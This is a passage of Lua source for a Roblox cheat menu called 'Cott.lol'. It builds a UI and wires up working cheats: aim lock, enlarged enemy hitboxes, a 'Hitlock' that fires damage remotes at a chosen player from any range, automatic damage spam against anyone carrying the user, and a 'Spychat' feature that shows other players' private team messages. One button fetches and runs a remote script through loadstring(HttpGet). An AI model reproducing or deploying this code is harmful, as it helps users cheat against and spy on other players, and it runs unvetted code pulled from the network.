                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = hue.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                picker.MouseEnter:Connect(function()
                    local input = picker.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                                local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                                local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                                updateValue(color)
                                oldpercentX,oldpercentY = xPercent,yPercent
                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = picker.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                hue.MouseMoved:connect(function(_, y)
                    hueY = y
                end)

                picker.MouseMoved:connect(function(x, y)
                    pickerX,pickerY = x,y
                end)

                table.insert(library.toInvis,colorFrame)
                library.flags[args.flag] = Color3.new(1,1,1)
                library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

                updateValue(args.color or Color3.new(1,1,1))
            end
            function group:addKeybind(args) 
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
                groupbox.Size += UDim2.new(0, 0, 0, 20)
                local waitingForKey = false
                
                local keybind = Instance.new("Frame")
                local text = Instance.new("TextLabel")
                local button = Instance.new("TextButton")
            
                keybind.Parent = grouper
                keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                keybind.BackgroundTransparency = 1.000
                keybind.BorderSizePixel = 0
                keybind.Size = UDim2.new(1, 0, 0, 20)
            
                text.Parent = keybind
                text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0, 5, 0, 0)
                text.Size = UDim2.new(1, -50, 1, 0)
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(244, 244, 244)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left
            
                button.Parent = keybind
                button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Position = UDim2.new(0, 195, 0, 0)
                button.Size = UDim2.new(0.02, 0, 1, 0)
                button.Font = Enum.Font.Code
                button.Text = "--"
                button.TextColor3 = Color3.fromRGB(155, 155, 155)
                button.TextSize = 13.000
                button.TextStrokeTransparency = 0.000
                button.TextXAlignment = Enum.TextXAlignment.Right
            
                function updateValue(val)
                    if library.colorpicking then return end
                    library.flags[args.flag] = val
                    button.Text = keyNames[val] or val.Name
                end
            
                inputService.InputBegan:Connect(function(key, gameProcessed)
                    local pressedKey = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                    
                    if gameProcessed then return end
                    
                    if waitingForKey then
                        if not table.find(library.blacklisted, pressedKey) then
                            waitingForKey = false
                            library.flags[args.flag] = pressedKey
                            button.Text = keyNames[pressedKey] or pressedKey.Name
                            button.TextColor3 = Color3.fromRGB(155, 155, 155)
                        end
                        return
                    end
            
                    if not waitingForKey and pressedKey == library.flags[args.flag] and args.callback then
                        args.callback()
                    end
                end)
            
                button.MouseButton1Click:Connect(function()
                    if library.colorpicking then return end
                    library.flags[args.flag] = Enum.KeyCode.Unknown
                    button.Text = "..."
                    button.TextColor3 = Color3.new(0.2,0.2,0.2)
                    waitingForKey = true
                end)
            
                library.flags[args.flag] = Enum.KeyCode.Unknown
                library.options[args.flag] = {type = "keybind", changeState = updateValue, skipflag = args.skipflag, oldargs = args}
            
                updateValue(args.key or Enum.KeyCode.Unknown)
            end            
            return group, groupbox
        end
        return tab
    end

    function contains(list, x)
        for _, v in pairs(list) do
            if v == x then return true end
        end
        return false
    end

    function library:createConfig()
        local name = library.flags["config_name"]
        if contains(library.options["selected_config"].values, name) then return library:notify(name..".cfg already exists!") end
        if name == "" then return library:notify("Put a name goofy") end
        local jig = {}
        for i,v in next, library.flags do
            if library.options[i].skipflag then continue end
            if typeof(v) == "Color3" then
                jig[i] = {v.R,v.G,v.B}
            elseif typeof(v) == "EnumItem" then
                jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
            else
                jig[i] = v
            end
        end
        writefile("CottCfgs/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
        library:notify("Succesfully created config "..name..".cfg!")
        library:refreshConfigs()
    end

    function library:saveConfig()
        local name = library.flags["selected_config"]
        local jig = {}
        for i,v in next, library.flags do
            if library.options[i].skipflag then continue end
            if typeof(v) == "Color3" then
                jig[i] = {v.R,v.G,v.B}
            elseif typeof(v) == "EnumItem" then
                jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
            else
                jig[i] = v
            end
        end
        writefile("CottCfgs/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
        library:notify("Succesfully updated config "..name..".cfg!")
        library:refreshConfigs()
    end

    function library:loadConfig()
        local name = library.flags["selected_config"]
        if not isfile("CottCfgs/"..name..".cfg") then
            library:notify("Config file not found!")
            return
        end
        local config = game:GetService("HttpService"):JSONDecode(readfile("CottCfgs/"..name..".cfg"))
        for i,v in next, library.options do
            spawn(function()pcall(function()
                if config[i] then
                    if v.type == "colorpicker" then
                        v.changeState(Color3.new(config[i][1],config[i][2],config[i][3]))
                    elseif v.type == "keybind" then
                        v.changeState(Enum[config[i][1]][config[i][2]])
                    else
                        if config[i] ~= library.flags[i] then
                            v.changeState(config[i])
                        end
                    end
                else
                    if v.type == "toggle" then
                        v.changeState(false)
                    elseif v.type == "slider" then
                        v.changeState(v.args.value or 0)
                    elseif v.type == "textbox" or v.type == "list" or v.type == "cfg" then
                        v.changeState(v.args.value or v.args.text or "")
                    elseif v.type == "colorpicker" then
                        v.changeState(v.args.color or Color3.new(1,1,1))
                    elseif option.type == "list" then
                        v.changeState("")
                    elseif option.type == "keybind" then
                        v.changeState(v.args.key or Enum.KeyCode.Unknown)
                    end
                end
            end)end)
        end
        library:notify("Succesfully loaded config "..name..".cfg!")
    end

    function library:refreshConfigs()
        local tbl = {}
        for i,v in next, listfiles("CottCfgs") do
            table.insert(tbl,v)
        end
        library.options["selected_config"].refresh(tbl)
    end

    function library:deleteConfig()
        if isfile("CottCfgs/"..library.flags["selected_config"]..".cfg") then
            delfile("CottCfgs/"..library.flags["selected_config"]..".cfg")
            library:refreshConfigs()
        end
    end

    menu.bg.pre.Text = 'Cott<font color="#F08ED6">.lol</font>   [ By <font color="#DC73C0">5quinn</font>  ///  discord: <font color="#ffb5ec">@qquixn</font> ]'
    local MiscTab = library:addTab("Miscellaneous")
    local AimGroup = MiscTab:createGroup('left', 'Aim-Assist')

    AimGroup:addToggle({
        text = "Enable",
        flag = "AEnable",
        callback = function(x)
            cottware["Cam Lock"].Enabled = x
        end
    })

    local AFov = AimGroup:addToggle({
        text = "Fov",
        flag = "AFov",
        callback = function(x)
            cottware["FOV"]["Cam Lock"].Visible = x
        end
    })

    AFov:addColorpicker({
        text = "Choose a color",
        flag = "AFovColor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            cottware["FOV"]["Cam Lock"].Color = color
        end
    })

    AimGroup:addKeybind({
        flag = "ABind",
        text = "Keybind",
        key = Enum.KeyCode.V,
        callback = function()
            local bindKey = library.flags["ABind"] 
            if bindKey and bindKey ~= Enum.KeyCode.Unknown then
                cottware["Cam Lock"]["Target Mode Bind"] = KeyCodeToString(bindKey)
            end
        end
    })

    AimGroup:addSlider({
        flag = "AFovSize",
        text = "Fov Size",
        min = 0,
        max = 100,
        value = 30,
        callback = function(x)
            cottware["FOV"]["Cam Lock"].Size = x
        end
    })

    AimGroup:addSlider({
        flag = "AFovThickness",
        text = "Fov Thickness",
        min = 0,
        max = 10,
        value = 1,
        callback = function(x)
            cottware["FOV"]["Cam Lock"].Thickness = x
        end
    })

    AimGroup:addSlider({
        flag = "AFovTransparency",
        text = "Fov Transparency",
        min = 0,
        max = 1,
        value = 1,
        Rounding = 2,
        callback = function(x)
            cottware["FOV"]["Cam Lock"].Transparency = x
        end
    })

    AimGroup:addList({
        flag = "ATargetPart",
        text = "Target Part",
        values = HitpartTable,
        value = "HumanoidRootPart",
        multiselect = false,
        callback = function(x)
            cottware["Cam Lock"]["Target Part"] = x
        end
    })

    local HbGroup = MiscTab:createGroup('left', 'Hitbox')

    _G.HitboxColor = Color3.fromRGB(0,0,0)
    _G.HeadSize = 3 
    _G.Disabled = true 
    _G.HitboxTransparency = 0.8

    local colorpickerwtoggle5 = HbGroup:addToggle({
        text = "Enable",
        flag = "HbEnable",
        callback = function(a)
            _G.Disabled = not a
        end
    })

    colorpickerwtoggle5:addColorpicker({
        text = "Choose a Color",
        flag = "HbColor",
        color = Color3.fromRGB(0,0,0),
        callback = function(color)
            _G.HitboxColor = color
        end
    })

    HbGroup:addSlider({
        flag = "HbSize",
        text = "Size",
        min = 0,
        max = 23,
        value = 3,
        callback = function(x)
            _G.HeadSize = x
        end
    })

    HbGroup:addSlider({
        flag = "HbTransparency",
        text = "Transparency",
        min = 0,
        max = 1,
        value = 0.8,
        Rounding = 2,
        callback = function(x)
            _G.HitboxTransparency = x
        end
    })

    game:GetService('RunService').RenderStepped:Connect(function()
        if not _G.Disabled then 
            for _, v in ipairs(game:GetService('Players'):GetPlayers()) do
                if v ~= game:GetService('Players').LocalPlayer then
                    pcall(function()
                        local humanoidRootPart = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                            humanoidRootPart.Transparency = _G.HitboxTransparency
                            humanoidRootPart.Color = _G.HitboxColor 
                            humanoidRootPart.Material = Enum.Material.Neon
                            humanoidRootPart.CanCollide = false
                        end
                    end)
                end
            end
        else
            for _, v in ipairs(game:GetService('Players'):GetPlayers()) do
                if v ~= game:GetService('Players').LocalPlayer then
                    pcall(function()
                        local humanoidRootPart = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Size = Vector3.new(2, 2, 2)
                            humanoidRootPart.Transparency = 1
                            humanoidRootPart.Color = Color3.fromRGB(0, 0, 255)
                            humanoidRootPart.Material = Enum.Material.SmoothPlastic
                            humanoidRootPart.CanCollide = true
                        end
                    end)
                end
            end
        end
    end)

    local FGroup = MiscTab:createGroup('center', 'Features')

    local isActive = false
    local HlColor = Color3.fromRGB(255,255,255)

    local colorpickerwtoggle = FGroup:addToggle({
        text = "Hitlock",
        flag = "HLToggle",
        callback = function(x)
            isActive = x
        end
    })

    FGroup:addToggle({
        text = "Fast Revolver",
        flag = "UMToggle",
        callback = function(x)
            getgenv().UnlegitHl = x

            if not isActive then
                library:notify("Turn on Hitlock.")
            end
        end
    })

    FGroup:addToggle({
        text = "Infinite Range",
        flag = "IRToggle",
        callback = function(x)
            getgenv().InfiniteRange = x
        end
    })

    plr:GetMouse().KeyDown:Connect(function(key)
        if not isActive then 
            for _, v in next, workspace:GetDescendants() do
                if v.Name == 'SelectedPlayer' then
                    v:Destroy()
                end
            end
            return 
        end

        if key == 'r' then
            tar = nil
            for _, v in next, workspace:GetDescendants() do
                if v.Name == 'SelectedPlayer' then
                    v:Destroy()
                end
            end

            local n_plr, dist
            for _, v in pairs(game.Players:GetPlayers()) do
                if v ~= plr and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
                    local distance = v:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
                    if v.Character and (not dist or distance <= dist) and v.Character:FindFirstChildOfClass'Humanoid' and v.Character:FindFirstChildOfClass'Humanoid'.Health > 0 and v.Character:FindFirstChild'HumanoidRootPart' then
                        dist = distance
                        n_plr = v
                    end
                end
            end
            if n_plr and n_plr.Character then
                local sp = Instance.new('SelectionBox', n_plr.Character.Torso)
                sp.Name = 'SelectedPlayer'
                sp.Adornee = n_plr.Character.HumanoidRootPart
                sp.Color3 = HlColor
                sp.Transparency = 0.6
                tar = n_plr
            end
        elseif key == 'q' and tar and plr.Character then
            for _, v in next, plr22.Character:GetDescendants() do
                if v:IsA'Tool' and v.Name ~= 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
                    AddCd(v, v.Cooldown.Value)

                    if v:FindFirstChild'Attack' and plr22.Character:FindFirstChildOfClass'Humanoid' then
                        plr22.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Attack):Play()
                    end

                    if v:FindFirstChild('Blade') then
                        local swingSound = v.Blade:FindFirstChild('SwingSound')
                        local hitSound = v.Blade:FindFirstChild('HitSound')

                        if swingSound and swingSound:IsA('Sound') then
                            swingSound:Play()
                        end

                        local humanoidTarget = tar.Character:FindFirstChildOfClass('Humanoid')
                        if humanoidTarget then
                            wait(0.2)

                            v.DamageRemote:FireServer(humanoidTarget)

                            if hitSound and hitSound:IsA('Sound') and isWithinDistance(plr22, tar, 20) then
                                hitSound:Play()
                            end
                        end
                    end
                elseif v:IsA'Tool' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' and tar and tar.Character and tar.Character:FindFirstChild'Head' then
                    v.Parent = plr22.Character
                    if getgenv().UnlegitHl then
                        AddCd(v, 0.8)
                    else
                        AddCd(v, 1.0)
                    end
                    rs.Stepped:Wait()
                    plr22.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Fire):Play()

                    if getgenv().InfiniteRange then
                        Shoot2(v.Barrel.Attachment.WorldPosition, tar.Character:WaitForChild("Torso").Position, v)
                        v.ReplicateRemote:FireServer(tar.Character:WaitForChild("Torso").Position) 
                    elseif not getgenv().InfiniteRange then 
                        Shoot(v.Barrel.Attachment.WorldPosition, tar.Character:WaitForChild("Torso").Position, v)
                        v.ReplicateRemote:FireServer(tar.Character:WaitForChild("Torso").Position)
                    end

                    local hitSound = v:FindFirstChild('HitSound')
                    if hitSound and hitSound:IsA('Sound') and isWithinDistance(plr22, tar, 20) then
                        hitSound:Play()
                    end
                end
            end
        end
    end)

    colorpickerwtoggle:addColorpicker({
        text = "Choose a Color",
        flag = "HitlockBoxColor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            HlColor = color

            for _, v in next, workspace:GetDescendants() do
                if v.Name == 'SelectedPlayer' then
                    v.Color3 = color
                end
            end
        end
    })

    local SpychatColor = Color3.fromRGB(240, 142, 214)

    local colorpickerwtoggle2 = FGroup:addToggle({
        text = "Spychat",
        flag = "SCToggle",
        callback = function(a)
            if a then
                enabled = true
                spyOnMyself = false
                public = false
                publicItalics = true
                privateProperties = {
                    Color = SpychatColor;
                    Font = Enum.Font.SourceSansBold;
                    TextSize = 18;
                }
                local StarterGui = game:GetService("StarterGui")
                local Players = game:GetService("Players")
                local player = Players.LocalPlayer
                local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
                local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
                local instance = (_G.chatSpyInstance or 0) + 1
                _G.chatSpyInstance = instance
                
                local function onChatted(p,msg)
                    if _G.chatSpyInstance == instance then
                        if p==player and msg:lower():sub(1,4)=="/spy" then
                            enabled = not enabled
                            wait(0.3)
                            privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
                            StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                        elseif enabled and (spyOnMyself==true or p~=player) then
                            msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
                            local hidden = true
                            local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
                                if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
                                    hidden = false
                                end
                            end)
                            wait(1)
                            conn:Disconnect()
                            if hidden and enabled then
                                if public then
                                    saymsg:FireServer((publicItalics and "/me " or '').."{Spy } [".. p.Name .."]: "..msg,"All")
                                else
                                    privateProperties.Text = "{Spy } [".. p.Name .."]: "..msg
                                    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                                end
                            end
                        end
                    end
                end
                
                for _,p in ipairs(Players:GetPlayers()) do
                    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
                end
                Players.PlayerAdded:Connect(function(p)
                    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
                end)
                privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
                StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                local chatFrame = player.PlayerGui.Chat.Frame
                chatFrame.ChatChannelParentFrame.Visible = true
                chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
            else
                enabled = false
                spyOnMyself = false
                public = false
                publicItalics = true
                privateProperties = {
                    Color = SpychatColor;
                    Font = Enum.Font.SourceSansBold;
                    TextSize = 18;
                }
                local StarterGui = game:GetService("StarterGui")
                local Players = game:GetService("Players")
                local player = Players.LocalPlayer
                local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
                local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
                local instance = (_G.chatSpyInstance or 0) + 1
                _G.chatSpyInstance = instance
                
                local function onChatted(p,msg)
                    if _G.chatSpyInstance == instance then
                        if p==player and msg:lower():sub(1,4)=="/spy" then
                            enabled = not enabled
                            wait(0.3)
                            privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
                            StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                        elseif enabled and (spyOnMyself==true or p~=player) then
                            msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
                            local hidden = true
                            local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
                                if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
                                    hidden = false
                                end
                            end)
                            wait(1)
                            conn:Disconnect()
                            if hidden and enabled then
                                if public then
                                    saymsg:FireServer((publicItalics and "/me " or '').."{Spy } [".. p.Name .."]: "..msg,"All")
                                else
                                    privateProperties.Text = "{Spy } [".. p.Name .."]: "..msg
                                    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                                end
                            end
                        end
                    end
                end
                
                for _,p in ipairs(Players:GetPlayers()) do
                    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
                end
                Players.PlayerAdded:Connect(function(p)
                    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
                end)
                privateProperties.Text = "{Spy "..(enabled and "En" or "Dis").."abled}"
                StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                local chatFrame = player.PlayerGui.Chat.Frame
                chatFrame.ChatChannelParentFrame.Visible = true
                chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
            end
        end
    })

    colorpickerwtoggle2:addColorpicker({
        text = "Choose a Color",
        flag = "SCColor",
        color = SpychatColor,
        callback = function(color)
            SpychatColor = color
        end
    })

    local Services = setmetatable({}, {
        __index = function(Self, Index)
            local NewService = game.GetService(game, Index)
            if NewService then
                Self[Index] = NewService
            end
            return NewService
        end
    })
    
    local AntiFlingLocalPlayer = Services.Players.LocalPlayer
    local AntiFlingEnabled = false 
    
    local function PlayerAdded(Player)
        local Detected = false
        local Character
        local PrimaryPart
    
        local function CharacterAdded(NewCharacter)
            Character = NewCharacter
            repeat
                wait()
                PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
            until PrimaryPart
            Detected = false
        end
    
        CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
        Player.CharacterAdded:Connect(CharacterAdded)
    
        Services.RunService.Heartbeat:Connect(function()
            if AntiFlingEnabled and (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
                if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                    Detected = true
                    for i, v in ipairs(Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                            v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                        end
                    end
                    PrimaryPart.CanCollide = false
                    PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                    PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                end
            end
        end)
    end
    
    for i, v in ipairs(Services.Players:GetPlayers()) do
        if v ~= AntiFlingLocalPlayer then
            PlayerAdded(v)
        end
    end
    Services.Players.PlayerAdded:Connect(PlayerAdded)
    
    local LastPosition = nil
    Services.RunService.Heartbeat:Connect(function()
        pcall(function()
            local PrimaryPart = AntiFlingLocalPlayer.Character.PrimaryPart
            if AntiFlingEnabled then
                if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
                    PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                    PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    PrimaryPart.CFrame = LastPosition
                elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
                    LastPosition = PrimaryPart.CFrame
                end
            end
        end)
    end)
    
    FGroup:addToggle({
        text = "Anti Fling", 
        flag = "AFToggle", 
        callback = function(v)
            AntiFlingEnabled = v 
        end
    })

    FGroup:addToggle({
        text = "Anti Spikes",
        flag = "ASToggle",
        callback = function(v)
            getgenv().AntiSpikes = v
            while true do
                if not getgenv().AntiSpikes then return end
                wait()
                local function removeTouchInterestFromSpikeTrap()
                    for _, object in pairs(game.Workspace:GetDescendants()) do
                        if object.Name == "Spike Trap" then
                            local button = object:FindFirstChild("Button")
                            if button then
                                for _, child in pairs(button:GetChildren()) do
                                    if child:IsA("TouchTransmitter") then
                                        child:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
                
                local player = game.Players.LocalPlayer
                
                player.CharacterAdded:Connect(function(character)
                    character:WaitForChild("HumanoidRootPart")
                    removeTouchInterestFromSpikeTrap()
                end)
                
                if player.Character then
                    removeTouchInterestFromSpikeTrap()
                end
                wait(1)
            end
        end
    })

    local playerX = game.Players.LocalPlayer
    local runService = game:GetService("RunService")
    local teleportDistance = 13
    local antiC4Active = false
    local antiGrenadeActive = false

    local function getAwayFromGrenade()
        if not antiGrenadeActive then return end
        local character = playerX.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local rootPart = character.HumanoidRootPart
        for _, grenade in pairs(game.Workspace:GetChildren()) do
            if grenade:IsA("Model") and grenade.Name == "Grenade Model" then
                local grenadePart = grenade.PrimaryPart or grenade:FindFirstChildWhichIsA("BasePart")
                if grenadePart then
                    local distance = (rootPart.Position - grenadePart.Position).Magnitude
                    if distance < teleportDistance then
                        local direction = (rootPart.Position - grenadePart.Position)
                        if direction.Magnitude > 0 then
                            direction = direction.Unit
                        else
                            direction = Vector3.new(1, 0, 0)
                        end
                        rootPart.CFrame = CFrame.new(rootPart.Position + direction * teleportDistance)
                    end
                end
            end
        end
    end

    local function getAwayFromC4()
        if not antiC4Active then return end
        local character = playerX.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local rootPart = character.HumanoidRootPart
        for _, c4 in pairs(game.Workspace:GetChildren()) do
            if c4:IsA("Model") and c4.Name == "C4 Model" then
                local c4Part = c4.PrimaryPart or c4:FindFirstChildWhichIsA("BasePart")
                if c4Part then
                    local distance = (rootPart.Position - c4Part.Position).Magnitude
                    if distance < teleportDistance then
                        local direction = (rootPart.Position - c4Part.Position)
                        if direction.Magnitude > 0 then
                            direction = direction.Unit
                        else
                            direction = Vector3.new(1, 0, 0)
                        end
                        rootPart.CFrame = CFrame.new(rootPart.Position + direction * teleportDistance)
                    end
                end
            end
        end
    end

    local antiGrenadeConnection
    FGroup:addToggle({
        text = "Anti Grenade",
        flag = "AGToggle",
        callback = function(state)
            antiGrenadeActive = state
            if state then
                if not antiGrenadeConnection then
                    antiGrenadeConnection = runService.Heartbeat:Connect(getAwayFromGrenade)
                end
            else
                if antiGrenadeConnection then
                    antiGrenadeConnection:Disconnect()
                    antiGrenadeConnection = nil
                end
            end
        end
    })

    local antiC4Connection
    FGroup:addToggle({
        text = "Anti C4",
        flag = "ACToggle",
        callback = function(state)
            antiC4Active = state
            if state then
                if not antiC4Connection then
                    antiC4Connection = runService.Heartbeat:Connect(getAwayFromC4)
                end
            else
                if antiC4Connection then
                    antiC4Connection:Disconnect()
                    antiC4Connection = nil
                end
            end
        end
    })

    local okplayer = game:GetService("Players")
    local Workspace = game:GetService("Workspace")

    local Tloser1 = okplayer.LocalPlayer
    local antiCarryEnabled = false 

    local function Tloser2(character)
        local Tloser3 = character:WaitForChild("Being Carried", 5)
        if Tloser3 and Tloser3:IsA("BoolValue") then
            Tloser3:GetPropertyChangedSignal("Value"):Connect(function()
                if antiCarryEnabled and Tloser3.Value == true then 
                    local Tloser4 = Tloser1:WaitForChild("Backpack")
                    for _, tool in pairs(Tloser4:GetChildren()) do
                        if tool:IsA("Tool") and tool:FindFirstChild("DamageRemote") and tool.Name ~= "Kawaii Revolver" then
                            character:WaitForChild("Humanoid"):EquipTool(tool)
                            break
                        end
                    end

                    local Tloser5 = character:FindFirstChildOfClass("Tool")
                    local Tloser6 = character:FindFirstChild("Humanoid")
                    if Tloser5 and Tloser5:FindFirstChild("DamageRemote") and Tloser6 then
                        repeat
                            if not antiCarryEnabled then break end 
                            Tloser5.DamageRemote:FireServer(Tloser6)
                            wait(0.1)
                        until Tloser6.Health <= 0 or Tloser3.Value == false
                    end
                end
            end)
        end
    end

    Tloser1.CharacterAdded:Connect(function(character)
        Tloser2(character)
    end)

    if Tloser1.Character then
        Tloser2(Tloser1.Character)
    end

    FGroup:addToggle({
        text = "Anti Carry",
        flag = "AVToggle",
        callback = function(state)
            antiCarryEnabled = state
        end
    })

    FGroup:addToggle({
        text = "Died Tp",
        flag = "DPToggle",
        callback = function(v)
            getgenv().DiedTp = v
            while true do
                if not getgenv().DiedTp then return end
                wait()
                if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
                    local pos = game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame
                    wait(6)
                    game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame = pos
                end
            end
        end
    })

    FGroup:addButton({
        text = "Infinite Yield",
        callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        end
    })

    FGroup:addKeybind({
        flag = "VBind",
        text = "Void (Carry Someone)",
        key = Enum.KeyCode.Question,
        callback = function()
            local character = game.Players.LocalPlayer.Character
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.CFrame = CFrame.new(10394, -113, -10404)
                wait(0.1)
                rootPart.CFrame = CFrame.new(10396.37, -426.99, -10406.17)
                
                if humanoid then
                    humanoid.Sit = true
                    task.wait(0.1)
                    if rootPart then
                        rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
                    end

                    for _, animation in ipairs(humanoid:GetPlayingAnimationTracks()) do
                        animation:Stop()
                    end
                end

                local player = game.Players.LocalPlayer
                local humanoid = game.Workspace[player.Name]:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                end
            else
                warn("HumanoidRootPart no encontrado.")
            end
        end
    })

    FGroup:addKeybind({
        flag = "FDJCFlag",
        text = "Fake Double Jump (C4)",
        key = Enum.KeyCode.Question,
        callback = function()
            local Players = game:GetService("Players")
            local UserInputService = game:GetService("UserInputService")
            local LocalPlayer = Players.LocalPlayer
            local plrs = game:GetService'Players'
            local plr = plrs.LocalPlayer
            local mouse = plr:GetMouse()
            
            local hasDoubleJumped = false
            local function performDoubleJump()
                local character = LocalPlayer.Character
                local humanoid = character and character:FindFirstChildOfClass('Humanoid')
                    if humanoid and not hasDoubleJumped then
                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                        wait(0.1)

                        for _,v in next,plr.Backpack:GetChildren() do
                            if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
                                v.Parent = plr.Character
                                wait()
                                humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                                wait(0.1)
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                                v.Parent = plr.Backpack
                            end
                        end
                        hasDoubleJumped = true
                    end
                end
            performDoubleJump()
        end
    })

    FGroup:addKeybind({
        flag = "FDJGFlag",
        text = "Fake Double Jump (Grenade)",
